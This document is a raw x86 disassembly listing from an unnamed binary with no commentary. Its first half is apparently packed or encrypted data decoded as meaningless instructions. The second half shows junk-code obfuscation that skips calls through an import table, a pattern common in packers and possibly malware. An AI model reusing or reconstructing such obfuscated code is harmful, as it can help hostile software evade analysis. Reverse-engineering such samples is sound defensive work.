  41cb7b:	test   DWORD PTR [edi+edx*2-0x20],ebp
  41cb7f:	mov    dh,BYTE PTR [edi]
  41cb81:	(bad)
  41cb85:	sbb    BYTE PTR [eax],ch
  41cb87:	out    dx,eax
  41cb88:	fisttp WORD PTR [esi-0x5d13a2ae]
  41cb8e:	push   ds
  41cb8f:	mov    DWORD PTR [esp+eiz*2],ebx
  41cb92:	add    DWORD PTR ds:0x7cc30338,0xffffff97
  41cb99:	icebp  
  41cb9a:	es cmp ecx,ebp
  41cb9d:	cwde   
  41cb9e:	add    esi,DWORD PTR [esi+0x5652e259]
  41cba4:	in     al,0xe0
  41cba6:	ss aad 0xd7
  41cba9:	mov    esi,0xfdf94fe3
  41cbae:	push   ds
  41cbaf:	sbb    cl,ch
  41cbb1:	and    eax,0xe0db2271
  41cbb6:	cmp    BYTE PTR [esi+0x422ad6aa],al
  41cbbc:	call   FWORD PTR [edx+0x60]
  41cbbf:	inc    edx
  41cbc0:	mov    ds:0x63b78b44,eax
  41cbc5:	sbb    edi,DWORD PTR [eax+0x7d]
  41cbc8:	leave  
  41cbc9:	(bad)  
  41cbca:	ss jmp 0x93a6fdd6
  41cbd0:	inc    edx
  41cbd1:	mov    edx,0xc9352398
  41cbd6:	ror    ch,1
  41cbd8:	jmp    0x9c925271
  41cbdd:	cli    
  41cbde:	push   cs
  41cbdf:	jmp    0xaf71702b
  41cbe4:	and    al,0x78
  41cbe6:	ins    DWORD PTR es:[edi],dx
  41cbe7:	shr    BYTE PTR [esi+ebp*8],cl
  41cbea:	aaa    
  41cbeb:	in     eax,0x4e
  41cbed:	(bad)  
  41cbee:	sbb    al,0xa6
  41cbf0:	xchg   edx,eax
  41cbf1:	and    al,0xc3
  41cbf3:	aaa    
  41cbf4:	retf   0xeca3
  41cbf7:	push   ebp
  41cbf8:	or     al,0xb
  41cbfa:	stos   DWORD PTR es:[edi],eax
  41cbfb:	and    ah,BYTE PTR [ebp+eax*2+0x4c831a03]
  41cc02:	clc    
  41cc03:	je     0x41cbd3
  41cc05:	in     al,dx
  41cc06:	out    dx,al
  41cc07:	repnz (bad) 
  41cc09:	push   esi
  41cc0a:	je     0x41cc41
  41cc0c:	and    BYTE PTR [edi],bh
  41cc0e:	sub    DWORD PTR [edx+ecx*1+0x6b],0xcca8fcd1
  41cc16:	out    0xbb,eax
  41cc18:	ins    DWORD PTR es:[edi],dx
  41cc19:	inc    esi
  41cc1a:	or     al,BYTE PTR [edx]
  41cc1c:	pusha  
  41cc1d:	test   BYTE PTR [ebp-0x1b],dh
  41cc20:	out    0xfd,al
  41cc22:	out    0x86,eax
  41cc24:	lds    ecx,FWORD PTR [ebx]
  41cc26:	mov    bl,0x7c
  41cc28:	loopne 0x41cc4c
  41cc2a:	mov    eax,ds:0xe5da944e
  41cc2f:	pop    ds
  41cc30:	fild   WORD PTR [edi-0x7]
  41cc33:	xchg   edi,eax
  41cc35:	ja     0x41cc91
  41cc37:	xchg   BYTE PTR [esp+eax*1+0x5484b130],bh
  41cc3e:	out    dx,eax
  41cc3f:	mov    eax,DWORD PTR [edi+0x116f43fb]
  41cc45:	test   al,0xef
  41cc47:	push   edx
  41cc48:	fucomp st(5)
  41cc4a:	push   edx
  41cc4b:	push   0xaa851a99
  41cc50:	out    0x83,eax
  41cc52:	leave  
  41cc53:	cmp    DWORD PTR [eax-0x40],eax
  41cc56:	ja     0x41cc7f
  41cc58:	adc    DWORD PTR [ebx+0x69],esi
  41cc5b:	dec    eax
  41cc5c:	jno    0x41cc31
  41cc5e:	push   esp
  41cc5f:	cmp    BYTE PTR [edi-0x3e],al
  41cc62:	iret   
  41cc63:	add    DWORD PTR ss:[esi],edi
  41cc66:	fst    DWORD PTR [edi-0x38]
  41cc69:	ja     0x41cc1c
  41cc6b:	pop    esp
  41cc6c:	sbb    eax,0x4fc56bc2
  41cc71:	ja     0x41ccee
  41cc73:	pop    edi
  41cc74:	ret    0xdf19
  41cc77:	dec    esp
  41cc78:	mov    dh,0xf6
  41cc7a:	dec    edx
  41cc7b:	sub    eax,0x6daba96c
  41cc80:	call   0x5115cc4d
  41cc85:	data16 sar BYTE PTR [esi-0x32f97970],cl
  41cc8c:	push   edi
  41cc8d:	dec    esp
  41cc8e:	btr    ecx,edx
  41cc91:	mov    es,esi
  41cc93:	out    0xb0,eax
  41cc95:	bnd ret 
  41cc97:	cmp    BYTE PTR [eax-0x74],dl
  41cc9a:	add    edx,DWORD PTR [ebx-0x62]
  41cc9d:	inc    edx
  41cc9e:	xchg   ebx,eax
  41cc9f:	and    BYTE PTR [edx-0x18526b6],dh
  41cca5:	lds    ebp,FWORD PTR [ebp+ecx*8+0x3b]
  41cca9:	(bad)  
  41ccaa:	mov    ah,0xbb
  41ccac:	inc    ecx
  41ccad:	sbb    ah,BYTE PTR [esi]
  41ccaf:	cmc    
  41ccb0:	mov    esi,0x700e376c
  41ccb5:	pop    ss
  41ccb6:	in     al,0x9e
  41ccb8:	cmp    DWORD PTR ds:[ebx],0x2e
  41ccbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccbd:	inc    edi
  41ccbe:	nop
  41ccbf:	mov    ebp,0x32db9b79
  41ccc4:	dec    esp
  41ccc5:	or     ch,BYTE PTR [ecx-0xe]
  41ccc8:	pop    edi
  41ccc9:	(bad)
  41cccc:	aam    0x74
  41ccce:	adc    ebx,DWORD PTR [ebp+0x2137b773]
  41ccd4:	mov    esi,0xd5d25cfa
  41ccd9:	mov    ds:0x344c0908,eax
  41ccde:	and    DWORD PTR [edi-0x5686265b],esp
  41cce4:	inc    esi
  41cce5:	mov    bl,0x30
  41cce7:	test   BYTE PTR [eax+edx*8],ch
  41ccea:	mov    edx,0xd64c23b0
  41ccef:	fucomi st,st(6)
  41ccf1:	retf   0x5ad1
  41ccf4:	xchg   DWORD PTR [ebp+0x25a30a7e],esp
  41ccfa:	push   ss
  41ccfb:	test   al,0xf2
  41ccfd:	mov    eax,ds:0x5d3a2a70
  41cd02:	daa    
  41cd03:	jp     0x41ccfd
  41cd05:	(bad)  
  41cd06:	jecxz  0x41cd65
  41cd08:	ins    BYTE PTR es:[edi],dx
  41cd09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd0a:	imul   ebx,DWORD PTR [ebx-0x30c8afd2],0xffffff88
  41cd11:	adc    al,0x43
  41cd13:	mov    dl,0x20
  41cd15:	dec    ebx
  41cd16:	sbb    al,0xe2
  41cd18:	outs   dx,DWORD PTR ds:[esi]
  41cd19:	xchg   ebx,eax
  41cd1a:	mov    bl,BYTE PTR [ebx+eax*8+0x3f]
  41cd1e:	adc    edx,eax
  41cd20:	in     al,dx
  41cd21:	shr    ch,1
  41cd23:	jo     0x41cd70
  41cd25:	sti    
  41cd26:	add    BYTE PTR [ecx-0x395f3024],ah
  41cd2c:	pushf  
  41cd2d:	mov    edx,0xfa0f9acc
  41cd32:	xchg   esi,eax
  41cd33:	lahf   
  41cd34:	(bad)  
  41cd35:	icebp  
  41cd36:	mov    bh,0x99
  41cd38:	pop    eax
  41cd39:	xchg   edx,eax
  41cd3a:	dec    edx
  41cd3b:	pop    esi
  41cd3c:	sub    al,0xb4
  41cd3e:	int3   
  41cd3f:	cdq    
  41cd40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd41:	inc    eax
  41cd42:	out    dx,al
  41cd43:	loope  0x41cd97
  41cd45:	sub    BYTE PTR [ebx+eax*1],ah
  41cd48:	ins    BYTE PTR es:[edi],dx
  41cd49:	clc    
  41cd4a:	mov    esi,DWORD PTR [esp+edi*4+0x3d]
  41cd4e:	or     bh,BYTE PTR [ebp+0x41]
  41cd51:	lahf   
  41cd52:	sub    al,0xa7
  41cd54:	nop
  41cd55:	shl    DWORD PTR ss:[eax+0x48fc16f7],1
  41cd5c:	mov    dh,0xb9
  41cd5e:	rcl    BYTE PTR [eax-0x1d],cl
  41cd61:	cwde   
  41cd62:	cld    
  41cd63:	add    ecx,DWORD PTR [ebp-0xc]
  41cd66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd67:	popf   
  41cd68:	in     eax,dx
  41cd69:	jle    0x41cde4
  41cd6b:	mov    ebx,0x29da2397
  41cd70:	jb     0x41cd52
  41cd72:	fisub  DWORD PTR [eax]
  41cd74:	lgs    ebx,FWORD PTR [eax+0x16817cdd]
  41cd7b:	enter  0xf32b,0xa8
  41cd7f:	push   ds
  41cd80:	xlat   BYTE PTR ds:[ebx]
  41cd81:	outs   dx,DWORD PTR ds:[esi]
  41cd82:	mov    dh,0x2a
  41cd84:	cmp    eax,0x3f2311f
  41cd89:	outs   dx,DWORD PTR ds:[esi]
  41cd8a:	int    0x58
  41cd8c:	outs   dx,BYTE PTR ds:[esi]
  41cd8d:	fsubrp st(5),st
  41cd8f:	mov    ebx,0x6c937a57
  41cd94:	xlat   BYTE PTR ds:[ebx]
  41cd95:	xchg   edi,eax
  41cd96:	adc    al,0x29
  41cd98:	push   ebp
  41cd99:	clc    
  41cd9a:	pop    esp
  41cd9b:	icebp  
  41cd9c:	je     0x41cdd5
  41cd9e:	xchg   ecx,eax
  41cd9f:	fmul   QWORD PTR [eax]
  41cda1:	xor    dl,dh
  41cda3:	dec    ecx
  41cda4:	lock push 0xfffffff6
  41cda7:	mov    ch,0xae
  41cda9:	add    BYTE PTR [ebp-0x58],dh
  41cdac:	cmp    al,0x54
  41cdae:	and    BYTE PTR [ecx+edx*4-0x9],al
  41cdb2:	daa    
  41cdb3:	mov    esp,0x20cc8adc
  41cdb8:	imul   ebx,DWORD PTR [edx-0x58],0x56
  41cdbc:	pop    edx
  41cdbd:	stos   DWORD PTR es:[edi],eax
  41cdbe:	dec    esi
  41cdbf:	rcl    BYTE PTR [ecx-0x19937afc],cl
  41cdc5:	(bad)  
  41cdc6:	cmp    al,0x18
  41cdc8:	pop    edx
  41cdc9:	repz hlt 
  41cdcb:	(bad)  
  41cdcc:	push   eax
  41cdcd:	cld    
  41cdce:	cld    
  41cdcf:	xor    DWORD PTR [esi-0x7a],0x39
  41cdd3:	pop    edi
  41cdd4:	mov    ebx,0xbd3975f7
  41cdd9:	push   ds
  41cdda:	mov    ah,BYTE PTR [edi+0x4d8d8605]
  41cde0:	sub    ebx,DWORD PTR [edi*1+0x24808f83]
  41cde7:	dec    edi
  41cde8:	jnp    0x41cdff
  41cdea:	out    0xa3,al
  41cdec:	xchg   BYTE PTR [edi-0x37],ah
  41cdef:	sub    ebx,DWORD PTR [esi+0x64b089dd]
  41cdf5:	sub    esi,DWORD PTR [edx+0x6e]
  41cdf8:	sar    BYTE PTR [edi-0x6b6b628c],1
  41cdfe:	ret    
  41cdff:	xor    DWORD PTR [eax],esp
  41ce01:	ins    BYTE PTR es:[edi],dx
  41ce02:	sbb    ch,BYTE PTR [ebx]
  41ce04:	mov    ebp,0xb53f7c68
  41ce09:	and    BYTE PTR [esi*2-0x4274ce72],dl
  41ce10:	retf   
  41ce11:	adc    edx,DWORD PTR [ebp-0x49]
  41ce14:	(bad)  
  41ce15:	jecxz  0x41ce41
  41ce17:	and    eax,0x61a9f43b
  41ce1c:	inc    ebx
  41ce1d:	pop    ebp
  41ce1e:	and    al,0x7c
  41ce20:	mov    ds:0xb730f400,al
  41ce25:	jno    0x41ce0f
  41ce27:	push   0x4cd21e18
  41ce2c:	imul   eax,edi,0xffffff82
  41ce2f:	rcr    ebp,1
  41ce31:	pop    ebp
  41ce32:	call   FWORD PTR [esi+0x53]
  41ce35:	jns    0x41ce5b
  41ce37:	mov    esi,0xd75e9cb1
  41ce3c:	cli    
  41ce3d:	xchg   ebp,eax
  41ce3e:	push   esi
  41ce3f:	out    dx,al
  41ce40:	inc    ebp
  41ce41:	mov    ecx,ecx
  41ce43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce44:	jg     0x41ce7a
  41ce46:	and    eax,0xd1bfd3c0
  41ce4b:	pop    ebp
  41ce4c:	pop    esi
  41ce4d:	fcmovnb st,st(7)
  41ce4f:	sahf   
  41ce50:	scas   al,BYTE PTR es:[edi]
  41ce51:	jnp    0x41ce27
  41ce53:	in     al,0xcf
  41ce55:	mov    BYTE PTR [ebp+0x72],dh
  41ce58:	xchg   ebx,eax
  41ce59:	add    ecx,0xedb638a2
  41ce5f:	pop    ebp
  41ce60:	leave  
  41ce61:	xchg   BYTE PTR [ebp-0x3d],bh
  41ce64:	mov    dh,0xb4
  41ce66:	and    eax,0xbae33d61
  41ce6b:	mov    al,0x16
  41ce6d:	push   edx
  41ce6e:	push   0xe1d2567b
  41ce73:	(bad)  
  41ce74:	pusha  
  41ce75:	cmp    bl,ch
  41ce77:	jle    0x41ceca
  41ce79:	(bad)  
  41ce7a:	aas    
  41ce7b:	xor    eax,0x5bb19a1b
  41ce80:	dec    ebp
  41ce81:	cmp    ch,0x98
  41ce84:	out    0xa1,al
  41ce86:	push   edi
  41ce87:	mov    esp,0x64c9e25c
  41ce8c:	fs pop ebx
  41ce8e:	pop    ds
  41ce8f:	aaa    
  41ce90:	or     DWORD PTR [esi],0xffffffbb
  41ce93:	jge    0x41ce16
  41ce95:	sub    eax,0x2e0cc74d
  41ce9a:	pop    ds
  41ce9b:	or     eax,0x54c24183
  41cea0:	jnp    0x41ceb9
  41cea2:	fimul  WORD PTR [esi+0x110c1806]
  41cea8:	add    dh,cl
  41ceaa:	icebp  
  41ceab:	(bad)  
  41ceac:	mov    eax,0x22f05286
  41ceb1:	mov    edi,0xc742271
  41ceb6:	shr    bl,cl
  41ceb8:	test   eax,0xba1c61d5
  41cebd:	adc    eax,DWORD PTR [edx]
  41cebf:	bswap  edx
  41cec1:	lods   eax,DWORD PTR ds:[esi]
  41cec2:	xchg   ebx,eax
  41cec3:	mov    ebp,0xb217093e
  41cec8:	int3   
  41cec9:	cmp    BYTE PTR [ecx+0x1c],ch
  41cecc:	adc    eax,ebx
  41cece:	aam    0xb0
  41ced0:	pop    esi
  41ced1:	in     al,dx
  41ced2:	xor    ebx,DWORD PTR [ebp-0x3]
  41ced5:	xor    ebp,DWORD PTR [eax]
  41ced7:	jnp    0x41cf4a
  41ced9:	pop    ss
  41ceda:	cdq    
  41cedb:	ficomp WORD PTR [esi+0x484a0ba8]
  41cee1:	aam    0x1c
  41cee3:	(bad)  
  41cee4:	sbb    BYTE PTR [eax-0x23dd12a4],bl
  41ceea:	jg     0x41cf61
  41ceec:	pop    eax
  41ceed:	and    eax,0xb27424f6
  41cef2:	inc    ecx
  41cef3:	inc    ecx
  41cef4:	mov    DWORD PTR [ebp-0x128],0x7537
  41cefe:	xor    DWORD PTR ds:0x428429,edx
  41cf04:	mov    DWORD PTR [ebp-0x114],0x6985
  41cf0e:	and    DWORD PTR ds:0x428499,ebx
  41cf14:	mov    DWORD PTR [ebp-0x14],0x5627
  41cf1b:	or     DWORD PTR ds:0x428401,0x428505
  41cf25:	mov    DWORD PTR [ebp-0x64],0x72e7
  41cf2c:	mov    eax,DWORD PTR [ebp-0x14]
  41cf2f:	and    DWORD PTR ds:0x428501,ebx
  41cf35:	add    eax,DWORD PTR [ebp-0x64]
  41cf38:	mov    ecx,DWORD PTR [ebp-0x114]
  41cf3e:	sbb    DWORD PTR ds:0x428485,0x4282ed
  41cf48:	sub    eax,ecx
  41cf4a:	xor    DWORD PTR ds:0x428321,edi
  41cf50:	mov    ecx,DWORD PTR [ebp-0x128]
  41cf56:	imul   eax,ecx
  41cf59:	cmp    DWORD PTR ds:0x428515,0x0
  41cf60:	mov    DWORD PTR ds:0x4284b1,0x44b
  41cf6a:	mov    ecx,DWORD PTR ds:0x428431
  41cf70:	mov    ecx,DWORD PTR ds:0x42842d
  41cf76:	mov    ecx,0x4ae9
  41cf7b:	jmp    0x41cfe3
  41cf80:	mov    ecx,DWORD PTR ds:0x4284a9
  41cf86:	mov    DWORD PTR ds:0x4282fd,0x5810
  41cf90:	cmp    DWORD PTR ds:0x428515,0x0
  41cf97:	ja     0x41cfcd
  41cf9d:	push   0x42850d
  41cfa2:	push   0x16d1
  41cfa7:	push   DWORD PTR [ebp-0x20]
  41cfaa:	push   0x7e78
  41cfaf:	call   DWORD PTR ds:0x42e078
  41cfb5:	mov    ecx,DWORD PTR ds:0x4282ed
  41cfbb:	sbb    DWORD PTR ds:0x42852d,ecx
  41cfc1:	sub    DWORD PTR ds:0x4283ed,ecx
  41cfc7:	not    DWORD PTR ds:0x4284a9
  41cfcd:	xor    DWORD PTR ds:0x4284a5,edi
  41cfd3:	mov    DWORD PTR ds:0x4283e5,0x4e0f
  41cfdd:	xor    ecx,DWORD PTR ds:0x428501
  41cfe3:	imul   eax,eax,0xe4e
  41cfe9:	mov    ecx,DWORD PTR [ebp-0x7c]
  41cfec:	or     eax,ecx
  41cfee:	mov    ecx,DWORD PTR [ebp+0x8]
  41cff1:	adc    DWORD PTR ds:0x428521,0xad
  41cffb:	lea    eax,[ecx+eax*1+0x46210209]
  41d002:	add    DWORD PTR ds:0x4283f9,0x55ef
  41d00c:	push   eax
  41d00d:	call   0x410df4
  41d012:	mov    ecx,eax
  41d014:	cmp    DWORD PTR ds:0x4282ed,0x0
  41d01b:	mov    esi,DWORD PTR ds:0x428525
  41d021:	mov    DWORD PTR ds:0x4283f1,0x25c4
  41d02b:	jmp    0x41d0fd
  41d030:	mov    DWORD PTR ds:0x42841d,0x7eed
  41d03a:	mov    DWORD PTR ds:0x42850d,edx
  41d040:	cmp    DWORD PTR ds:0x4282ed,0x0
  41d047:	jbe    0x41d070
  41d04d:	push   0x428321
  41d052:	call   DWORD PTR ds:0x42e2a0
  41d058:	and    esi,esi
  41d05a:	and    esi,DWORD PTR ds:0x428489
  41d060:	mov    esi,DWORD PTR ds:0x4284c1
  41d066:	mov    esi,DWORD PTR [esi]
  41d068:	xor    DWORD PTR ds:0x428499,esi
  41d06e:	xor    esi,esi
  41d070:	add    DWORD PTR ds:0x428305,ebx
  41d076:	movzx  esi,BYTE PTR ds:0x428511
  41d07d:	sbb    DWORD PTR ds:0x428415,esi
  41d083:	sbb    DWORD PTR ds:0x428519,0x4283c9
  41d08d:	or     esi,esi
  41d08f:	cmp    DWORD PTR ds:0x42831d,0x0
  41d096:	mov    DWORD PTR ds:0x4284a1,0x3cb6
  41d0a0:	mov    esi,0x65ca
  41d0a5:	mov    DWORD PTR ds:0x4284b1,edi
  41d0ab:	jmp    0x41d0fd
  41d0b0:	mov    DWORD PTR ds:0x42850d,edi
  41d0b6:	mov    eax,0x6c7b
  41d0bb:	cmp    DWORD PTR ds:0x42831d,0x0
  41d0c2:	jg     0x41d0eb
  41d0c8:	push   0x1a0a
  41d0cd:	push   DWORD PTR [ebp-0x24]
  41d0d0:	push   DWORD PTR [ebp-0xc]
  41d0d3:	call   DWORD PTR ds:0x42e12c
  41d0d9:	and    DWORD PTR ds:0x4284fd,edx
  41d0df:	xor    DWORD PTR ds:0x428309,ebx
  41d0e5:	sub    esi,0x4c5f
  41d0eb:	sbb    DWORD PTR ds:0x4282e1,0x56b4
  41d0f5:	sbb    esi,esi
  41d0f7:	add    DWORD PTR ds:0x4283f9,ebx
  41d0fd:	mov    eax,DWORD PTR [ebp-0xc4]
  41d103:	imul   eax,eax,0x21b3
  41d109:	cmp    DWORD PTR ds:0x428305,0x0
  41d110:	mov    esi,0x3999
  41d115:	movzx  esi,BYTE PTR ds:0x428511
  41d11c:	mov    esi,0x5e4b
  41d121:	mov    esi,DWORD PTR ds:0x4282e9
  41d127:	jmp    0x41d1a8
  41d12c:	mov    DWORD PTR ds:0x42849d,0x7a2a
  41d136:	not    esi
  41d138:	cmp    DWORD PTR ds:0x428305,0x0
  41d13f:	jb     0x41d183
  41d145:	push   0x5450
  41d14a:	push   0x3c7c
  41d14f:	call   DWORD PTR ds:0x42e07c
  41d155:	mov    esi,DWORD PTR ds:0x4284f9
  41d15b:	add    esi,DWORD PTR ds:0x42841d
  41d161:	mov    DWORD PTR ds:0x4284f9,esi
  41d167:	mov    esi,DWORD PTR ds:0x4283c1
  41d16d:	and    esi,DWORD PTR ds:0x4283e9
  41d173:	mov    DWORD PTR ds:0x4283c1,esi
  41d179:	sbb    DWORD PTR ds:0x428431,0x6b94
  41d183:	mov    esi,DWORD PTR ds:0x4283fd
  41d189:	add    DWORD PTR ds:0x428485,esi
  41d18f:	movzx  esi,WORD PTR ds:0x4283f9
  41d196:	adc    esi,DWORD PTR ds:0x428315
  41d19c:	mov    DWORD PTR ds:0x4283f9,esi
  41d1a2:	xor    DWORD PTR ds:0x4282e9,edi
  41d1a8:	add    eax,DWORD PTR [ebp-0xe4]
  41d1ae:	and    eax,0xd5c
  41d1b3:	sub    eax,0x2e81
  41d1b8:	xor    edx,edx
  41d1ba:	sbb    DWORD PTR ds:0x42830d,ebx
  41d1c0:	mov    esi,0x2f1dc
  41d1c5:	or     DWORD PTR ds:0x4282f5,0x1bf3
  41d1cf:	div    esi
  41d1d1:	cmp    DWORD PTR ds:0x42840d,0x0
  41d1d8:	mov    DWORD PTR ds:0x428501,0x7c0f
  41d1e2:	mov    DWORD PTR ds:0x428429,0x21cd
  41d1ec:	mov    esi,DWORD PTR ds:0x4282e1
  41d1f2:	jmp    0x41d24d
  41d1f7:	mov    DWORD PTR ds:0x42852d,0x7012
  41d201:	mov    esi,0x5ebc
  41d206:	cmp    DWORD PTR ds:0x42840d,0x0
  41d20d:	jne    0x41d239
  41d213:	push   0x389e
  41d218:	push   0x768e
  41d21d:	push   0x6d0b
  41d222:	push   0x8403
  41d227:	call   DWORD PTR ds:0x42e130
  41d22d:	sbb    edx,DWORD PTR ds:0x428425
  41d233:	add    edx,0x16c4
  41d239:	movzx  esi,WORD PTR ds:0x4283b5
  41d240:	adc    DWORD PTR ds:0x428485,esi
  41d246:	sub    DWORD PTR ds:0x428499,edx
  41d24c:	inc    esi
  41d24d:	xor    eax,0x56ef
  41d252:	add    DWORD PTR ds:0x428511,0x7098
  41d25c:	add    ecx,eax
  41d25e:	cmp    DWORD PTR ds:0x4283e9,0x0
  41d265:	mov    DWORD PTR ds:0x42830d,0x1f02
  41d26f:	mov    esi,0x4128
  41d274:	mov    esi,DWORD PTR ds:0x42847d
  41d27a:	jmp    0x41d2f7
  41d27f:	mov    DWORD PTR ds:0x4284fd,ebx
  41d285:	movzx  eax,WORD PTR ds:0x4283cd
  41d28c:	cmp    DWORD PTR ds:0x4283e9,0x0
  41d293:	jb     0x41d2d0
  41d299:	push   0x4840
  41d29e:	push   DWORD PTR [ebp-0x14]
  41d2a1:	push   0x75a6
  41d2a6:	push   DWORD PTR [ebp-0xc]
  41d2a9:	push   0x4281f3
  41d2ae:	push   DWORD PTR [ebp-0x28]
  41d2b1:	call   DWORD PTR ds:0x42e134
  41d2b7:	movzx  esi,BYTE PTR ds:0x4284f9
  41d2be:	xor    DWORD PTR ds:0x428495,esi
  41d2c4:	xor    esi,edx
  41d2c6:	or     DWORD PTR ds:0x428421,0x2eb3
  41d2d0:	xor    DWORD PTR ds:0x42850d,ebx
  41d2d6:	adc    edx,DWORD PTR ds:0x428521
  41d2dc:	add    DWORD PTR ds:0x4282fd,0x1b5f
  41d2e6:	mov    esi,DWORD PTR ds:0x4284c9
  41d2ec:	mov    edx,DWORD PTR ds:0x428561
  41d2f2:	sub    edx,esi
  41d2f4:	sub    esi,DWORD PTR [esi+edx*1]
  41d2f7:	mov    DWORD PTR [ebp-0x90],ecx
  41d2fd:	mov    DWORD PTR [ebp-0xe0],0x7a31
  41d307:	mov    DWORD PTR ds:0x4283ed,0x52c8
  41d311:	mov    DWORD PTR [ebp-0x44],0x2514
  41d318:	mov    DWORD PTR [ebp-0xdc],0x699c
  41d322:	cmp    DWORD PTR ds:0x428489,0x0
  41d329:	mov    DWORD PTR ds:0x4284b1,0x628e
  41d333:	movzx  ecx,BYTE PTR ds:0x428301
  41d33a:	mov    ecx,DWORD PTR ds:0x4283e1
  41d340:	jmp    0x41d3bd
  41d345:	mov    DWORD PTR ds:0x4283bd,0x21ce
  41d34f:	mov    DWORD PTR ds:0x428319,edi
  41d355:	cmp    DWORD PTR ds:0x428489,0x0
  41d35c:	jge    0x41d39a
  41d362:	push   DWORD PTR [ebp-0x20]
  41d365:	push   DWORD PTR [ebp-0xc]
  41d368:	push   DWORD PTR [ebp-0x18]
  41d36b:	call   DWORD PTR ds:0x42e138
  41d371:	mov    ecx,DWORD PTR ds:0x428345
  41d377:	mov    edx,DWORD PTR ds:0x428569
  41d37d:	sub    ecx,edx
  41d37f:	sub    ecx,DWORD PTR [ecx+edx*1]
  41d382:	sub    ecx,0x1d69
  41d388:	mov    ecx,DWORD PTR ds:0x428465
  41d38e:	mov    edx,DWORD PTR ds:0x42855d
  41d394:	sub    ecx,edx
  41d396:	imul   ecx,DWORD PTR [ecx+edx*1]
  41d39a:	sbb    DWORD PTR ds:0x4284a1,0x4f1
  41d3a4:	sub    esi,DWORD PTR ds:0x42852d
  41d3aa:	xor    esi,esi
  41d3ac:	add    esi,DWORD PTR ds:0x428389
  41d3b2:	mov    edx,DWORD PTR ds:0x42843d
  41d3b8:	sub    edx,esi
  41d3ba:	add    esi,DWORD PTR [esi+edx*1]
  41d3bd:	mov    DWORD PTR [ebp-0xd8],0x1
  41d3c7:	mov    DWORD PTR [ebp-0x24],0x7901
  41d3ce:	mov    esi,DWORD PTR ds:0x428355
  41d3d4:	xor    ecx,ecx
  41d3d6:	or     ecx,DWORD PTR ds:0x428361
  41d3dc:	sub    esi,ecx
  41d3de:	sub    esi,DWORD PTR [esi+ecx*1]
  41d3e1:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  41d3eb:	mov    DWORD PTR [ebp-0x78],0x37f2
  41d3f2:	add    edx,eax
  41d3f4:	mov    DWORD PTR [ebp-0x10],0x62ba
  41d3fb:	mov    DWORD PTR [ebp-0x94],0x561c
  41d405:	mov    DWORD PTR [ebp-0x34],0x58bc
  41d40c:	mov    ecx,DWORD PTR ds:0x4283b9
  41d412:	xor    DWORD PTR ds:0x428485,ecx
  41d418:	mov    DWORD PTR [ebp-0x60],0x24c7
  41d41f:	mov    DWORD PTR [ebp-0x5c],0x7a45
  41d426:	adc    eax,eax
  41d428:	mov    eax,DWORD PTR [ebp-0x34]
  41d42b:	add    edx,esi
  41d42d:	mov    ecx,DWORD PTR [ebp-0x60]
  41d430:	adc    DWORD PTR ds:0x42852d,0x4282e9
  41d43a:	mov    edx,DWORD PTR [ebp-0x5c]
  41d43d:	neg    esi
  41d43f:	and    edx,0x160e
  41d445:	and    DWORD PTR ds:0x428519,0x7809
  41d44f:	sub    edx,ecx
  41d451:	sub    edx,0x29ad
  41d457:	cmp    DWORD PTR ds:0x4283d9,0x0
  41d45e:	mov    DWORD PTR ds:0x4284fd,0x177e
  41d468:	mov    DWORD PTR ds:0x428479,0x4211
  41d472:	mov    esi,0x2b55
  41d477:	mov    ecx,DWORD PTR ds:0x428489
  41d47d:	jmp    0x41d4d7
  41d482:	mov    DWORD PTR ds:0x428321,edx
  41d488:	cmp    DWORD PTR ds:0x4283d9,0x0
  41d48f:	jbe    0x41d4cb
  41d495:	push   0x428521
  41d49a:	push   0x428115
  41d49f:	push   0x5caf
  41d4a4:	push   DWORD PTR [ebp-0x28]
  41d4a7:	push   0x7d55
  41d4ac:	call   DWORD PTR ds:0x42e080
  41d4b2:	or     DWORD PTR ds:0x4284f5,ebx
  41d4b8:	xor    ecx,ecx
  41d4ba:	add    ecx,DWORD PTR ds:0x428339
  41d4c0:	mov    esi,DWORD PTR ds:0x428395
  41d4c6:	sub    esi,ecx
  41d4c8:	and    ecx,DWORD PTR [ecx+esi*1]
  41d4cb:	or     DWORD PTR ds:0x428521,0x760f
  41d4d5:	xor    ecx,ecx
  41d4d7:	imul   edx,eax
  41d4da:	sbb    DWORD PTR ds:0x428525,edi
  41d4e0:	mov    eax,DWORD PTR [ebp-0x90]
  41d4e6:	lea    eax,[eax+edx*1+0x14f2e240]
  41d4ed:	add    edx,ecx
  41d4ef:	mov    DWORD PTR [ebp-0x174],eax
  41d4f5:	mov    eax,DWORD PTR [ebp-0x24]
  41d4f8:	mov    ecx,DWORD PTR [ebp-0x94]
  41d4fe:	mov    edx,DWORD PTR [ebp-0x10]
  41d501:	or     DWORD PTR ds:0x42831d,ecx
  41d507:	xor    edx,ecx
  41d509:	add    edx,DWORD PTR [ebp-0x78]
  41d50c:	not    ecx
  41d50e:	mov    ecx,DWORD PTR [ebp-0xc0]
  41d514:	lea    ecx,[edx+ecx*1+0x6ac1]
  41d51b:	and    ecx,eax
  41d51d:	add    esi,esi
  41d51f:	mov    eax,0x1101
  41d524:	or     esi,DWORD PTR ds:0x42852d
  41d52a:	sub    eax,ecx
  41d52c:	adc    DWORD PTR ds:0x428325,ebx
  41d532:	add    eax,DWORD PTR [ebp+0x8]
  41d535:	cmp    DWORD PTR ds:0x428511,0x0
  41d53c:	mov    DWORD PTR ds:0x428415,0x5bb
  41d546:	mov    edx,0x635
  41d54b:	mov    DWORD PTR ds:0x428415,0x7e26
  41d555:	jmp    0x41d5d0
  41d55a:	mov    DWORD PTR ds:0x428325,0x7d12
  41d564:	cmp    DWORD PTR ds:0x428511,0x0
  41d56b:	jae    0x41d5af
  41d571:	push   DWORD PTR [ebp-0x24]
  41d574:	push   0x16b6
  41d579:	push   DWORD PTR [ebp-0x10]
  41d57c:	push   0x5f53
  41d581:	push   DWORD PTR [ebp-0x1c]
  41d584:	push   DWORD PTR [ebp-0x18]
  41d587:	push   DWORD PTR [ebp-0x28]
  41d58a:	push   0x42822f
  41d58f:	call   DWORD PTR ds:0x42e2a4
  41d595:	adc    DWORD PTR ds:0x4282e9,0x7656
  41d59f:	sbb    DWORD PTR ds:0x4284b1,edx
